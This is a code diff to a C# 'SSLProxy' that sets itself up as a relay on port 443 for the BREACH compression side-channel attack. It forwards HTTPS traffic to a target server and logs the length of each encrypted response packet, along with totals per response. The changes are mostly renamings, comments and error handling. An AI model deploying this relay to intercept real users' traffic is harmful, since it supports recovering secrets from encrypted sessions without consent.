@@ -13,7 +13,7 @@ namespace SSLProxy
 
         static void Main(string[] args)
         {
-            int receivedSinceLastPush = 0;
+            int responseBytesTotal = 0;
             int sequence = 0, i = 0;
 
             Socket listenSocket = InitializeSocketLibrary();
@@ -29,6 +29,7 @@ namespace SSLProxy
 
             Console.WriteLine("[BREACH SSL Relay ready on 443]\n");
 
+            // Keep the proxy up & running
             while (true)
             {
                 // Every 1000 closed sockets, force cleanup & garbage collection
@@ -68,17 +69,13 @@ namespace SSLProxy
                     }
                 } while (connectedSocket == null);
 
-                if (connectedSocket == null)
-                {
-                    Console.WriteLine(listenSocket.LastErrorText);
-                    continue; // return;
-                }
 
                 // Connect to outbound target
+                // BLIND SSL Relay (no need to establish a new SSL tunnel)
                 if (!outboundSocket.Connect(TargetIP, 443, false, 10000))
                 {
                     Console.WriteLine(outboundSocket.LastErrorText + "\r\n");
-                    continue; // return;
+                    continue;
                 }
 
                 //  Set maximum timeouts for reading an writing (in millisec)
@@ -92,13 +89,14 @@ namespace SSLProxy
                 bool receivingServer = false;
 
 
-                // Request starts here, receive from client
+                // Main loop for SSL Proxy - Processing and forwarding flows in both 
+                // directions so long the conneciton is kept alive
                 while (true)
                 {
                     if (!connectedSocket.IsConnected)
                         break;
 
-                    byte[] bytes = null;
+                    byte[] requestBytes = null;
 
                     if (!receivingClient)
                     {
@@ -109,7 +107,8 @@ namespace SSLProxy
                             if (!connectedSocket.AsyncReceiveBytes())
                             {
                                 Console.WriteLine(connectedSocket.LastErrorText + "\r\n");
-                                continue; // return;
+                                Thread.Sleep(100);
+                                break; 
                             }
                         }
                         catch (AccessViolationException e)
@@ -120,39 +119,41 @@ namespace SSLProxy
                         }
                     }
 
-                    // Write to log
+                    // Request starts here, receive from client
                     if (receivingClient
                         && connectedSocket.AsyncReceiveFinished)
                     {
                         receivingClient = false;
-                        bytes = connectedSocket.AsyncReceivedBytes;
-                        if (bytes != null && bytes.Length > 0)
+                        requestBytes = connectedSocket.AsyncReceivedBytes;
+                        if (requestBytes != null && requestBytes.Length > 0)
                         {
-                            Console.WriteLine(" >>> rcv: " + receivedSinceLastPush);
+                            Console.WriteLine(" >>> rcv: " + responseBytesTotal);
 
-                            if (receivedSinceLastPush != 0
+                            if (responseBytesTotal != 0
                                 && File.Exists(PacketRealTimeLog))
                             {
-                                // Log bytes received since last push
-                                LogPacketLength(PacketRealTimeLog, "--- " + receivedSinceLastPush,
+                                // Since we are detecting a new request and HTTP is synchronous, we now know the previous 
+                                // response has completed, and we measure the aggregated byte count for all its packets
+                                LogPacketLength(PacketRealTimeLog, "--- " + responseBytesTotal,
                                     FileMode.Append, FileAccess.Write, FileShare.Read);
 
                                 Console.WriteLine("\n----------------\n");
                             }
 
 
-                            // Relay bytes to target serer
-                            if (!outboundSocket.SendBytes(bytes))
+                            // Relay bytes to target server
+                            if (!outboundSocket.SendBytes(requestBytes))
                             {
                                 Console.WriteLine(connectedSocket.LastErrorText + "\r\n");
-                                continue; // return;
+                                Thread.Sleep(100);
+                                break;
                             }
                         }
                     }
 
 
                     // Response starts here
-                    byte[] bytes2 = null;
+                    byte[] responseBytes = null;
 
                     if (!receivingServer)
                     {
@@ -163,7 +164,8 @@ namespace SSLProxy
                             if (!outboundSocket.AsyncReceiveBytes())
                             {
                                 Console.WriteLine("## Error (004) " + outboundSocket.LastErrorText + "\r\n");
-                                continue; // return;
+                                Thread.Sleep(100);
+                                continue;
                             }
                         }
                         catch (System.AccessViolationException e)
@@ -179,27 +181,28 @@ namespace SSLProxy
                         && outboundSocket.AsyncReceiveFinished)
                     {
                         receivingServer = false;
-                        bytes2 = outboundSocket.AsyncReceivedBytes;
+                        responseBytes = outboundSocket.AsyncReceivedBytes;
 
-                        if (bytes2 != null && bytes2.Length > 0)
+                        if (responseBytes != null && responseBytes.Length > 0)
                         {
-                            received += bytes2.Length;
-                            Console.WriteLine("<<" + bytes2.Length);
+                            received += responseBytes.Length;
+                            Console.WriteLine("<<" + responseBytes.Length);
                             sequence++;
 
-                            // Real time packet log
-                            LogPacketLength(PacketRealTimeLog, sequence + " " + bytes2.Length,
+                            // Real time packet log (logging each individual packet length for BREACH)
+                            LogPacketLength(PacketRealTimeLog, sequence + " " + responseBytes.Length,
                                 FileMode.Append, FileAccess.Write, FileShare.Read);
 
 
                             Console.Title = "received: " + received;
-                            receivedSinceLastPush += bytes2.Length;
+                            responseBytesTotal += responseBytes.Length;
 
                             // Relay to client
-                            if (!connectedSocket.SendBytes(bytes2))
+                            if (!connectedSocket.SendBytes(responseBytes))
                             {
                                 Console.WriteLine("## Error (005) " + connectedSocket.LastErrorText + "\r\n");
-                                continue; // return;
+                                Thread.Sleep(100);
+                                break;
                             }
                         }
 
